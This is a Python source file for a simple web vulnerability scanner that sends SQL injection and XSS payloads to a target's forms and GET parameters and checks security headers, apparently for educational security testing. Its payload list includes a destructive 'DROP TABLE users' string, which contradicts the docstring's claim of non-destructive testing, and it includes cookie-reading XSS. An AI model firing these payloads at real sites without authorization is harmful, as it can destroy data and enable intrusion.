"""
Web Vulnerability Scanner
Tests target URLs for SQL Injection and XSS vulnerabilities.
Uses safe, passive payload testing — no destructive operations.
"""

import requests
import time
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urlencode
from datetime import datetime

requests.packages.urllib3.disable_warnings()

# ─── Payloads ────────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "1' ORDER BY 1--",
    "1 UNION SELECT null,null--",
    "' AND 1=2 UNION SELECT 1,2,3--",
    "admin'--",
]

SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax",
    "ora-01756",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "postgresql",
    "pg_query()",
    "sqlite3",
    "syntax error",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "'><script>alert(document.cookie)</script>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "\"><img src=1 onerror=alert('XSS')>",
]

COMMON_PATHS = [
    "/", "/login", "/search", "/index.php", "/admin",
    "/wp-login.php", "/register", "/contact",
]

HEADERS_TO_CHECK = {
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": None,
    "Content-Security-Policy": None,
    "Strict-Transport-Security": None,
    "X-XSS-Protection": None,
}

TIMEOUT = 6
SESSION = requests.Session()
SESSION.headers.update({
    "User-Agent": "MiniSOC-VulnScanner/1.0 (Educational/Authorized Use Only)"
})


# ─── Helpers ─────────────────────────────────────────────────────────────────

def _get(url, params=None):
    try:
        r = SESSION.get(url, params=params, timeout=TIMEOUT, verify=False,
                        allow_redirects=True)
        return r
    except Exception as e:
        return None


def _post(url, data=None):
    try:
        r = SESSION.post(url, data=data, timeout=TIMEOUT, verify=False,
                         allow_redirects=True)
        return r
    except Exception as e:
        return None


def _find_forms(html, base_url):
    """Extract all forms and their input fields from a page."""
    soup = BeautifulSoup(html, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action", "")
        method = form.get("method", "get").lower()
        full_action = urljoin(base_url, action) if action else base_url
        inputs = []
        for tag in form.find_all(["input", "textarea", "select"]):
            name = tag.get("name", "")
            typ = tag.get("type", "text")
            val = tag.get("value", "test")
            if name:
                inputs.append({"name": name, "type": typ, "value": val})
        forms.append({"action": full_action, "method": method, "inputs": inputs})
    return forms


# ─── Scan functions ──────────────────────────────────────────────────────────

def _scan_sqli_get(url, progress_cb=None):
    findings = []
    for payload in SQLI_PAYLOADS:
        r = _get(url, params={"id": payload, "search": payload, "q": payload})
        if r is None:
            continue
        body_lower = r.text.lower()
        for err in SQLI_ERRORS:
            if err in body_lower:
                findings.append({
                    "type": "SQL Injection",
                    "severity": "critical",
                    "url": url,
                    "method": "GET",
                    "payload": payload,
                    "evidence": err,
                    "detail": f"SQL error triggered via GET param with payload: {payload!r}",
                })
                break
        if progress_cb:
            progress_cb()
    return findings


def _scan_sqli_forms(url, forms, progress_cb=None):
    findings = []
    for form in forms:
        for payload in SQLI_PAYLOADS[:4]:   # limit form payloads
            data = {inp["name"]: payload for inp in form["inputs"]
                    if inp["type"] not in ("submit", "hidden", "checkbox", "radio")}
            if not data:
                continue
            if form["method"] == "post":
                r = _post(form["action"], data)
            else:
                r = _get(form["action"], data)
            if r is None:
                continue
            body_lower = r.text.lower()
            for err in SQLI_ERRORS:
                if err in body_lower:
                    findings.append({
                        "type": "SQL Injection",
                        "severity": "critical",
                        "url": form["action"],
                        "method": form["method"].upper(),
                        "payload": payload,
                        "evidence": err,
                        "detail": f"SQL error triggered via form submission",
                    })
                    break
            if progress_cb:
                progress_cb()
    return findings


def _scan_xss(url, forms, progress_cb=None):
    findings = []
    for form in forms:
        for payload in XSS_PAYLOADS[:4]:
            data = {inp["name"]: payload for inp in form["inputs"]
                    if inp["type"] not in ("submit", "hidden")}
            if not data:
                continue
            if form["method"] == "post":
                r = _post(form["action"], data)
            else:
                r = _get(form["action"], data)
            if r is None:
                continue
            if payload in r.text or payload.lower() in r.text.lower():
                findings.append({
                    "type": "Cross-Site Scripting (XSS)",
                    "severity": "high",
                    "url": form["action"],
                    "method": form["method"].upper(),
                    "payload": payload,
                    "evidence": "Payload reflected in response",
                    "detail": "XSS payload was reflected unescaped in server response",
                })
            if progress_cb:
                progress_cb()
    # Also test GET params
    for payload in XSS_PAYLOADS[:3]:
        r = _get(url, params={"q": payload, "search": payload})
        if r and (payload in r.text or payload.lower() in r.text.lower()):
            findings.append({
                "type": "Cross-Site Scripting (XSS)",
                "severity": "high",
                "url": url,
                "method": "GET",
                "payload": payload,
                "evidence": "Payload reflected in response",
                "detail": "Reflected XSS via GET parameter",
            })
        if progress_cb:
            progress_cb()
    return findings


def _check_security_headers(url):
    findings = []
    r = _get(url)
    if r is None:
        return findings
    for header, expected in HEADERS_TO_CHECK.items():
        val = r.headers.get(header)
        if val is None:
            findings.append({
                "type": "Missing Security Header",
                "severity": "low",
                "url": url,
                "method": "GET",
                "payload": "",
                "evidence": f"Header '{header}' not present",
                "detail": f"The response does not include the '{header}' header, "
                          f"which helps prevent common web attacks.",
            })
        elif expected and expected not in val.lower():
            findings.append({
                "type": "Misconfigured Security Header",
                "severity": "low",
                "url": url,
                "method": "GET",
                "payload": "",
                "evidence": f"{header}: {val}",
                "detail": f"Header present but value may be insufficient.",
            })
    return findings


# ─── Main scan entry ─────────────────────────────────────────────────────────

def scan(target_url, progress_cb=None):
    """
    Full vulnerability scan of target_url.
    progress_cb(current, total, message) called periodically.
    Returns a report dict.
    """
    start = time.time()
    report = {
        "target": target_url,
        "started_at": datetime.now().isoformat(),
        "findings": [],
        "stats": {
            "pages_scanned": 0,
            "forms_found": 0,
            "payloads_tested": 0,
        },
        "summary": "",
        "elapsed": 0,
    }

    # Parse & validate URL
    parsed = urlparse(target_url)
    if not parsed.scheme:
        target_url = "http://" + target_url
    if not parsed.netloc:
        report["summary"] = "Invalid URL"
        return report

    # Fetch homepage
    r = _get(target_url)
    if r is None:
        report["summary"] = f"Could not connect to {target_url}"
        return report

    report["stats"]["pages_scanned"] += 1
    forms = _find_forms(r.text, target_url)
    report["stats"]["forms_found"] = len(forms)

    all_findings = []

    # Security headers
    all_findings += _check_security_headers(target_url)

    # SQLi GET
    all_findings += _scan_sqli_get(target_url, progress_cb)

    # SQLi forms
    all_findings += _scan_sqli_forms(target_url, forms, progress_cb)

    # XSS
    all_findings += _scan_xss(target_url, forms, progress_cb)

    # Deduplicate by (type, url, payload)
    seen = set()
    for f in all_findings:
        key = (f["type"], f["url"], f["payload"])
        if key not in seen:
            seen.add(key)
            report["findings"].append(f)

    # Summary
    critical = sum(1 for f in report["findings"] if f["severity"] == "critical")
    high = sum(1 for f in report["findings"] if f["severity"] == "high")
    low = sum(1 for f in report["findings"] if f["severity"] == "low")

    report["elapsed"] = round(time.time() - start, 2)
    report["stats"]["payloads_tested"] = (
        len(SQLI_PAYLOADS) + len(XSS_PAYLOADS) * len(forms)
    )
    report["summary"] = (
        f"Found {len(report['findings'])} issue(s): "
        f"{critical} critical, {high} high, {low} low. "
        f"Scan completed in {report['elapsed']}s."
    )
    report["finished_at"] = datetime.now().isoformat()
    return report


# ─── Demo scan (uses a known-vulnerable test target) ─────────────────────────

DEMO_TARGETS = [
    "http://testphp.vulnweb.com",
    "http://zero.webappsecurity.com",
]


def demo_scan(progress_cb=None):
    """Scan a safe, intentionally vulnerable demo site."""
    target = DEMO_TARGETS[0]
    return scan(target, progress_cb)
